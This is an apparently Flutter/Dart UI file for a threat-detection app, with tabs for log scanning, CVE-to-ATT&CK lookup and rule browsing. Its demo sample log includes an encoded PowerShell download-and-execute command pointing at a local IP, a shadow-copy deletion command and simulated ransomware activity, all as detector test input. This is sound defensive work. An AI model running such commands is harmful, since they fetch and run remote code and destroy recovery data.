// lib/features/detection/presentation/screens/detection_screens.dart
//
// Pillar 5 — Real Detection UI
//
// Three screens exported:
//   DetectionHomeScreen      — hub with tabs for Log Analysis / CVE / Rules
//   LogAnalysisTab           — paste / upload logs → indicator report
//   CveLookupTab             — search CVE-ID or keyword → ATT&CK mapping
//   DetectionRulesTab        — browse all 40+ indicator rules
//
// Routes to add in GoRouter:
//   GoRoute(path: '/detection', builder: (_, __) => const DetectionHomeScreen())

import 'package:flutter/material.dart';
import 'package:hooks_riverpod/hooks_riverpod.dart';
import 'package:attackshield/core/services/detection_service.dart';
import 'package:attackshield/shared/providers/plain_language_providers.dart';

// ═══════════════════════════════════════════════════════════════
// LOCAL STATE PROVIDERS
// ═══════════════════════════════════════════════════════════════

final _logTextProvider = StateProvider<String>((ref) => '');
final _cveQueryProvider = StateProvider<String>((ref) => '');
final _ruleFilterProvider = StateProvider<String>((ref) => '');

// ═══════════════════════════════════════════════════════════════
// DETECTION HOME — tabbed hub
// ═══════════════════════════════════════════════════════════════

class DetectionHomeScreen extends ConsumerWidget {
  const DetectionHomeScreen({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final appMode = ref.watch(appModeProvider);
    final isPlain = appMode == AppMode.plainLanguageMode;

    return DefaultTabController(
      length: 3,
      child: Scaffold(
        appBar: AppBar(
          title: Text(isPlain ? '🔍 Find Threats in Your Logs' : 'Detection'),
          bottom: TabBar(
            tabs: [
              Tab(text: isPlain ? 'Log Scanner' : 'Log Analysis'),
              Tab(text: isPlain ? 'CVE Check' : 'CVE Lookup'),
              Tab(text: isPlain ? 'Detection Rules' : 'Rules'),
            ],
          ),
        ),
        body: const TabBarView(
          children: [LogAnalysisTab(), CveLookupTab(), DetectionRulesTab()],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// TAB 1 — LOG ANALYSIS
// ═══════════════════════════════════════════════════════════════

class LogAnalysisTab extends ConsumerWidget {
  const LogAnalysisTab({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final logText = ref.watch(_logTextProvider);
    final appMode = ref.watch(appModeProvider);
    final isPlain = appMode == AppMode.plainLanguageMode;
    final analysis = ref.watch(logAnalysisProvider(logText));

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // ── instructions ──────────────────────────────────
          _InfoCard(
            icon: isPlain ? '📋' : '📄',
            title: isPlain
                ? 'Paste your Windows or security logs below'
                : 'Paste log text for analysis',
            body: isPlain
                ? 'Copy logs from Event Viewer, your firewall, or antivirus and paste here. '
                      'We\'ll scan for signs of attack and tell you what to do.'
                : 'Supports Windows Event Logs, Syslog, firewall logs, and generic text. '
                      'Indicators are matched against 40+ ATT&CK-aligned rules.',
          ),
          const SizedBox(height: 12),

          // ── log input ─────────────────────────────────────
          TextField(
            maxLines: 8,
            decoration: InputDecoration(
              hintText: isPlain
                  ? 'Paste your logs here…\n\nExample: paste from Windows Event Viewer'
                  : 'Paste Windows Event Logs, syslog, EDR output…',
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(8),
              ),
              filled: true,
            ),
            style: const TextStyle(fontFamily: 'monospace', fontSize: 12),
            onChanged: (v) => ref.read(_logTextProvider.notifier).state = v,
          ),
          const SizedBox(height: 8),

          // ── action buttons ────────────────────────────────
          Row(
            children: [
              Expanded(
                child: ElevatedButton.icon(
                  icon: const Icon(Icons.search),
                  label: Text(isPlain ? 'Scan for Threats' : 'Analyse'),
                  onPressed: logText.trim().isEmpty
                      ? null
                      : () => ref.refresh(logAnalysisProvider(logText)),
                ),
              ),
              const SizedBox(width: 8),
              OutlinedButton(
                onPressed: () {
                  ref.read(_logTextProvider.notifier).state = '';
                },
                child: const Text('Clear'),
              ),
            ],
          ),
          const SizedBox(height: 8),

          // ── sample log button ─────────────────────────────
          TextButton.icon(
            icon: const Icon(Icons.science_outlined, size: 16),
            label: Text(isPlain ? 'Try with a sample log' : 'Load sample'),
            onPressed: () {
              ref.read(_logTextProvider.notifier).state = _sampleLog;
            },
          ),
          const SizedBox(height: 20),

          // ── results ───────────────────────────────────────
          if (logText.trim().isNotEmpty)
            analysis.when(
              loading: () => const Center(child: CircularProgressIndicator()),
              error: (e, _) => Text('Error: $e'),
              data: (result) =>
                  _LogAnalysisResults(result: result, isPlain: isPlain),
            ),
        ],
      ),
    );
  }
}

// ── log analysis results ──────────────────────────────────────

class _LogAnalysisResults extends StatelessWidget {
  final LogAnalysisResult result;
  final bool isPlain;

  const _LogAnalysisResults({required this.result, required this.isPlain});

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        // Score header
        _ScoreHeader(result: result, isPlain: isPlain),
        const SizedBox(height: 16),

        // Summary
        Text(result.summary, style: Theme.of(context).textTheme.bodyMedium),
        const SizedBox(height: 20),

        // Indicators found
        if (result.indicators.isNotEmpty) ...[
          Text(
            isPlain
                ? '⚠️ Threats Found (${result.indicatorsFound})'
                : 'Indicators (${result.indicatorsFound})',
            style: Theme.of(
              context,
            ).textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 8),
        ],

        ...(result.indicators.toList()
              // Critical first
              ..sort(
                (a, b) => _severityRank(
                  b.severity,
                ).compareTo(_severityRank(a.severity)),
              ))
            .map((ind) => _IndicatorCard(indicator: ind, isPlain: isPlain)),

        if (result.indicators.isEmpty) ...[
          const _InfoCard(
            icon: '✅',
            title: 'No indicators found',
            body:
                'No known attack patterns detected. This may mean the logs are clean, '
                'or the attack uses techniques not yet in our ruleset.',
          ),
        ],

        const SizedBox(height: 20),

        // Coverage stats
        Text(
          isPlain ? '📊 What You Can Detect' : 'Detection Coverage',
          style: Theme.of(
            context,
          ).textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold),
        ),
        const SizedBox(height: 8),
        LinearProgressIndicator(
          value: result.detectionCoveragePercent / 100,
          minHeight: 10,
          backgroundColor: Colors.grey.shade200,
          color: result.detectionCoveragePercent > 60
              ? Colors.green
              : result.detectionCoveragePercent > 30
              ? Colors.orange
              : Colors.red,
        ),
        const SizedBox(height: 4),
        Text(
          '${result.detectionCoveragePercent.toStringAsFixed(0)}% of tracked techniques visible in these logs',
          style: Theme.of(context).textTheme.bodySmall,
        ),
        const SizedBox(height: 8),
        Text(
          isPlain
              ? 'Techniques you can detect: ${result.techniquesCovered.length}'
              : 'Covered: ${result.techniquesCovered.join(", ")}',
          style: Theme.of(
            context,
          ).textTheme.bodySmall?.copyWith(color: Colors.green),
        ),
      ],
    );
  }

  int _severityRank(String s) {
    switch (s) {
      case 'Critical':
        return 4;
      case 'High':
        return 3;
      case 'Medium':
        return 2;
      default:
        return 1;
    }
  }
}

class _ScoreHeader extends StatelessWidget {
  final LogAnalysisResult result;
  final bool isPlain;

  const _ScoreHeader({required this.result, required this.isPlain});

  @override
  Widget build(BuildContext context) {
    final critCount = result.indicators
        .where((i) => i.severity == 'Critical')
        .length;
    final color = critCount > 0
        ? Colors.red
        : result.indicatorsFound > 0
        ? Colors.orange
        : Colors.green;

    return Card(
      color: color.withValues(alpha: 0.08),
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(12),
        side: BorderSide(color: color.withValues(alpha: 0.4)),
      ),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Row(
          children: [
            Text(
              critCount > 0
                  ? '🚨'
                  : result.indicatorsFound > 0
                  ? '⚠️'
                  : '✅',
              style: const TextStyle(fontSize: 36),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    isPlain
                        ? (critCount > 0
                              ? 'Serious threats found!'
                              : result.indicatorsFound > 0
                              ? 'Some threats detected'
                              : 'Looks clean')
                        : '${result.indicatorsFound} indicators across ${result.techniquesCovered.length} techniques',
                    style: Theme.of(context).textTheme.titleMedium?.copyWith(
                      fontWeight: FontWeight.bold,
                      color: color,
                    ),
                  ),
                  Text(
                    '${result.linesScanned} lines scanned',
                    style: Theme.of(
                      context,
                    ).textTheme.bodySmall?.copyWith(color: Colors.grey),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class _IndicatorCard extends StatelessWidget {
  final DetectedIndicator indicator;
  final bool isPlain;

  const _IndicatorCard({required this.indicator, required this.isPlain});

  @override
  Widget build(BuildContext context) {
    final severityColor = _color(indicator.severity);

    return Card(
      margin: const EdgeInsets.only(bottom: 10),
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(8),
        side: BorderSide(color: severityColor.withValues(alpha: 0.5)),
      ),
      child: ExpansionTile(
        leading: Container(
          width: 6,
          height: 40,
          decoration: BoxDecoration(
            color: severityColor,
            borderRadius: BorderRadius.circular(3),
          ),
        ),
        title: Text(
          isPlain ? indicator.plainName : indicator.techniqueName,
          style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 14),
        ),
        subtitle: Row(
          children: [
            _SeverityChip(severity: indicator.severity),
            const SizedBox(width: 6),
            Text(
              indicator.attackId,
              style: const TextStyle(
                fontFamily: 'monospace',
                fontSize: 11,
                color: Colors.grey,
              ),
            ),
            const Spacer(),
            Text(
              'Line ${indicator.lineNumber}',
              style: const TextStyle(fontSize: 10, color: Colors.grey),
            ),
          ],
        ),
        children: [
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Evidence
                const Text(
                  'Evidence:',
                  style: TextStyle(fontWeight: FontWeight.bold, fontSize: 12),
                ),
                const SizedBox(height: 4),
                Container(
                  width: double.infinity,
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: Colors.grey.shade100,
                    borderRadius: BorderRadius.circular(4),
                  ),
                  child: Text(
                    indicator.evidence,
                    style: const TextStyle(
                      fontFamily: 'monospace',
                      fontSize: 11,
                    ),
                  ),
                ),
                const SizedBox(height: 12),

                // Recommendation
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: Colors.green.shade50,
                    border: Border.all(color: Colors.green.shade200),
                    borderRadius: BorderRadius.circular(6),
                  ),
                  child: Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('✅ ', style: TextStyle(fontSize: 14)),
                      Expanded(
                        child: Text(
                          indicator.recommendation,
                          style: const TextStyle(fontSize: 12),
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Color _color(String severity) {
    switch (severity) {
      case 'Critical':
        return Colors.red;
      case 'High':
        return Colors.orange;
      case 'Medium':
        return Colors.amber;
      default:
        return Colors.blue;
    }
  }
}

// ═══════════════════════════════════════════════════════════════
// TAB 2 — CVE LOOKUP
// ═══════════════════════════════════════════════════════════════

class CveLookupTab extends ConsumerWidget {
  const CveLookupTab({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final query = ref.watch(_cveQueryProvider);
    final appMode = ref.watch(appModeProvider);
    final isPlain = appMode == AppMode.plainLanguageMode;
    final results = ref.watch(cveMappingProvider(query));

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _InfoCard(
            icon: '🔎',
            title: isPlain
                ? 'Check if a known vulnerability affects you'
                : 'CVE → ATT&CK Technique Mapping',
            body: isPlain
                ? 'Enter a CVE number (like CVE-2021-44228) or a software name (like "Log4j" or "Exchange") '
                      'to see what techniques an attacker could use against you.'
                : 'Queries the NVD API and maps CVSS data to relevant ATT&CK techniques. '
                      'Requires internet access.',
          ),
          const SizedBox(height: 12),

          // Search field
          Row(
            children: [
              Expanded(
                child: TextField(
                  decoration: InputDecoration(
                    hintText: 'CVE-2021-44228 or "Exchange" or "Log4j"',
                    prefixIcon: const Icon(Icons.search),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(8),
                    ),
                    isDense: true,
                  ),
                  textInputAction: TextInputAction.search,
                  onSubmitted: (v) =>
                      ref.read(_cveQueryProvider.notifier).state = v,
                ),
              ),
              const SizedBox(width: 8),
              ElevatedButton(
                onPressed: () {
                  // Trigger by setting same value to force refresh
                  final current = ref.read(_cveQueryProvider);
                  ref.read(_cveQueryProvider.notifier).state = '';
                  Future.microtask(
                    () => ref.read(_cveQueryProvider.notifier).state = current,
                  );
                },
                child: const Text('Go'),
              ),
            ],
          ),
          const SizedBox(height: 8),

          // Quick examples
          Wrap(
            spacing: 6,
            children: ['CVE-2021-44228', 'Exchange', 'Log4j', 'PrintNightmare']
                .map(
                  (ex) => ActionChip(
                    label: Text(ex, style: const TextStyle(fontSize: 11)),
                    onPressed: () =>
                        ref.read(_cveQueryProvider.notifier).state = ex,
                  ),
                )
                .toList(),
          ),
          const SizedBox(height: 20),

          if (query.trim().isNotEmpty)
            results.when(
              loading: () => const Center(
                child: Padding(
                  padding: EdgeInsets.all(32),
                  child: CircularProgressIndicator(),
                ),
              ),
              error: (e, _) => Text('Error: $e'),
              data: (mappings) =>
                  _CveResultsList(mappings: mappings, isPlain: isPlain),
            ),
        ],
      ),
    );
  }
}

class _CveResultsList extends StatelessWidget {
  final List<CveMapping> mappings;
  final bool isPlain;

  const _CveResultsList({required this.mappings, required this.isPlain});

  @override
  Widget build(BuildContext context) {
    if (mappings.isEmpty) {
      return const _InfoCard(
        icon: '❓',
        title: 'No results',
        body: 'Try a different CVE ID or keyword.',
      );
    }

    return Column(
      children: mappings
          .map((m) => _CveCard(mapping: m, isPlain: isPlain))
          .toList(),
    );
  }
}

class _CveCard extends StatelessWidget {
  final CveMapping mapping;
  final bool isPlain;

  const _CveCard({required this.mapping, required this.isPlain});

  @override
  Widget build(BuildContext context) {
    final severityColor = _cvssColor(mapping.cvssScore);

    return Card(
      margin: const EdgeInsets.only(bottom: 12),
      child: Padding(
        padding: const EdgeInsets.all(14),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Header row
            Row(
              children: [
                Expanded(
                  child: Text(
                    mapping.cveId,
                    style: const TextStyle(
                      fontFamily: 'monospace',
                      fontWeight: FontWeight.bold,
                      fontSize: 14,
                    ),
                  ),
                ),
                Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 8,
                    vertical: 3,
                  ),
                  decoration: BoxDecoration(
                    color: severityColor.withValues(alpha: 0.15),
                    border: Border.all(color: severityColor),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Text(
                    '${mapping.cvssScore.toStringAsFixed(1)} ${mapping.severity}',
                    style: TextStyle(
                      fontSize: 11,
                      color: severityColor,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 6),

            // Description
            Text(
              mapping.description,
              style: const TextStyle(fontSize: 12, color: Colors.black87),
            ),
            const SizedBox(height: 10),

            // ATT&CK techniques
            if (mapping.attackIds.isNotEmpty) ...[
              Text(
                isPlain
                    ? 'What attackers can do:'
                    : 'Mapped ATT&CK Techniques:',
                style: const TextStyle(
                  fontWeight: FontWeight.bold,
                  fontSize: 12,
                ),
              ),
              const SizedBox(height: 4),
              Wrap(
                spacing: 6,
                children: List.generate(mapping.attackIds.length, (i) {
                  return Chip(
                    label: Text(
                      '${mapping.attackIds[i]} · ${mapping.techniqueNames[i]}',
                      style: const TextStyle(fontSize: 10),
                    ),
                    visualDensity: VisualDensity.compact,
                    backgroundColor: Colors.red.shade50,
                  );
                }),
              ),
              const SizedBox(height: 10),
            ],

            // Mitigations
            if (mapping.mitigations.isNotEmpty) ...[
              Text(
                isPlain ? '✅ What to do:' : 'Recommended Mitigations:',
                style: const TextStyle(
                  fontWeight: FontWeight.bold,
                  fontSize: 12,
                ),
              ),
              const SizedBox(height: 4),
              ...mapping.mitigations.map(
                (m) => Padding(
                  padding: const EdgeInsets.only(bottom: 2),
                  child: Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('• ', style: TextStyle(fontSize: 12)),
                      Expanded(
                        child: Text(m, style: const TextStyle(fontSize: 12)),
                      ),
                    ],
                  ),
                ),
              ),
            ],

            // Published
            const SizedBox(height: 4),
            Text(
              'Published: ${mapping.publishedDate}',
              style: const TextStyle(fontSize: 10, color: Colors.grey),
            ),
          ],
        ),
      ),
    );
  }

  Color _cvssColor(double score) {
    if (score >= 9.0) return Colors.red.shade900;
    if (score >= 7.0) return Colors.red;
    if (score >= 4.0) return Colors.orange;
    return Colors.blue;
  }
}

// ═══════════════════════════════════════════════════════════════
// TAB 3 — DETECTION RULES BROWSER
// ═══════════════════════════════════════════════════════════════

class DetectionRulesTab extends ConsumerWidget {
  const DetectionRulesTab({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final filter = ref.watch(_ruleFilterProvider);
    final rules = ref.watch(allDetectionRulesProvider);
    final appMode = ref.watch(appModeProvider);
    final isPlain = appMode == AppMode.plainLanguageMode;

    final filtered = filter.isEmpty
        ? rules
        : rules
              .where(
                (r) =>
                    r.attackId.toLowerCase().contains(filter.toLowerCase()) ||
                    r.techniqueName.toLowerCase().contains(
                      filter.toLowerCase(),
                    ) ||
                    r.plainName.toLowerCase().contains(filter.toLowerCase()) ||
                    r.keywords.any(
                      (k) => k.toLowerCase().contains(filter.toLowerCase()),
                    ),
              )
              .toList();

    return Column(
      children: [
        // Filter bar
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 12, 16, 4),
          child: TextField(
            decoration: InputDecoration(
              hintText: 'Filter rules…',
              prefixIcon: const Icon(Icons.search, size: 18),
              isDense: true,
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(8),
              ),
            ),
            onChanged: (v) => ref.read(_ruleFilterProvider.notifier).state = v,
          ),
        ),

        Padding(
          padding: const EdgeInsets.fromLTRB(16, 4, 16, 4),
          child: Text(
            '${filtered.length} rules',
            style: const TextStyle(fontSize: 11, color: Colors.grey),
          ),
        ),

        Expanded(
          child: ListView.separated(
            itemCount: filtered.length,
            separatorBuilder: (_, _) => const Divider(height: 1, indent: 16),
            itemBuilder: (context, i) =>
                _RuleListTile(rule: filtered[i], isPlain: isPlain),
          ),
        ),
      ],
    );
  }
}

class _RuleListTile extends StatelessWidget {
  final IndicatorRule rule;
  final bool isPlain;

  const _RuleListTile({required this.rule, required this.isPlain});

  @override
  Widget build(BuildContext context) {
    return ExpansionTile(
      leading: _SeverityChip(severity: rule.severity),
      title: Text(
        isPlain ? rule.plainName : rule.techniqueName,
        style: const TextStyle(fontSize: 13, fontWeight: FontWeight.w600),
      ),
      subtitle: Text(
        rule.attackId,
        style: const TextStyle(
          fontFamily: 'monospace',
          fontSize: 11,
          color: Colors.grey,
        ),
      ),
      children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 0, 16, 14),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // Keywords
              const Text(
                'Detection keywords:',
                style: TextStyle(fontWeight: FontWeight.bold, fontSize: 12),
              ),
              const SizedBox(height: 4),
              Wrap(
                spacing: 4,
                runSpacing: 4,
                children: rule.keywords
                    .take(8)
                    .map(
                      (k) => Container(
                        padding: const EdgeInsets.symmetric(
                          horizontal: 6,
                          vertical: 2,
                        ),
                        decoration: BoxDecoration(
                          color: Colors.grey.shade100,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: Colors.grey.shade300),
                        ),
                        child: Text(
                          k,
                          style: const TextStyle(
                            fontFamily: 'monospace',
                            fontSize: 10,
                          ),
                        ),
                      ),
                    )
                    .toList(),
              ),

              // Windows Event IDs
              if (rule.windowsEventIds.isNotEmpty) ...[
                const SizedBox(height: 8),
                Text(
                  'Windows Event IDs: ${rule.windowsEventIds.join(", ")}',
                  style: const TextStyle(fontSize: 11, color: Colors.blueGrey),
                ),
              ],

              const SizedBox(height: 10),

              // Recommendation
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.green.shade50,
                  border: Border.all(color: Colors.green.shade200),
                  borderRadius: BorderRadius.circular(6),
                ),
                child: Text(
                  '✅ ${rule.recommendation}',
                  style: const TextStyle(fontSize: 12),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// SHARED WIDGETS
// ═══════════════════════════════════════════════════════════════

class _InfoCard extends StatelessWidget {
  final String icon;
  final String title;
  final String body;

  const _InfoCard({
    required this.icon,
    required this.title,
    required this.body,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.blue.shade50,
        border: Border.all(color: Colors.blue.shade200),
        borderRadius: BorderRadius.circular(8),
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(icon, style: const TextStyle(fontSize: 22)),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: const TextStyle(
                    fontWeight: FontWeight.bold,
                    fontSize: 13,
                  ),
                ),
                const SizedBox(height: 3),
                Text(
                  body,
                  style: const TextStyle(fontSize: 12, color: Colors.black87),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class _SeverityChip extends StatelessWidget {
  final String severity;

  const _SeverityChip({required this.severity});

  @override
  Widget build(BuildContext context) {
    Color color;
    switch (severity) {
      case 'Critical':
        color = Colors.red;
        break;
      case 'High':
        color = Colors.orange;
        break;
      case 'Medium':
        color = Colors.amber;
        break;
      default:
        color = Colors.blue;
    }

    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.12),
        border: Border.all(color: color.withValues(alpha: 0.5)),
        borderRadius: BorderRadius.circular(10),
      ),
      child: Text(
        severity,
        style: TextStyle(
          fontSize: 10,
          color: color,
          fontWeight: FontWeight.bold,
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// SAMPLE LOG (for demo / testing)
// ═══════════════════════════════════════════════════════════════

const _sampleLog = '''
2024-01-15 09:23:11 EventID=4625 Account Name: john.doe Failure Reason: Unknown user name or bad password Logon Type: 3
2024-01-15 09:23:14 EventID=4625 Account Name: admin Failure Reason: Unknown user name or bad password Logon Type: 3
2024-01-15 09:23:17 EventID=4625 Account Name: administrator Failure Reason: Unknown user name or bad password Logon Type: 3
2024-01-15 09:24:01 EventID=4688 Process Name: C:\\Windows\\System32\\cmd.exe CommandLine: cmd.exe /c whoami /all
2024-01-15 09:24:15 EventID=4688 Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQ==
2024-01-15 09:25:44 EventID=4688 Process Name: C:\\Windows\\System32\\vssadmin.exe CommandLine: vssadmin delete shadows /all /quiet
2024-01-15 09:26:01 EventID=7036 Service Name: Windows Defender Antivirus Service Status: Stopped
2024-01-15 09:27:33 File renamed: C:\\Users\\john.doe\\Documents\\report.docx -> C:\\Users\\john.doe\\Documents\\report.docx.locked
2024-01-15 09:27:34 File renamed: C:\\Users\\john.doe\\Documents\\invoice.xlsx -> C:\\Users\\john.doe\\Documents\\invoice.xlsx.locked
2024-01-15 09:28:01 README_HOW_TO_DECRYPT.txt created in C:\\Users\\john.doe\\Documents\\
''';
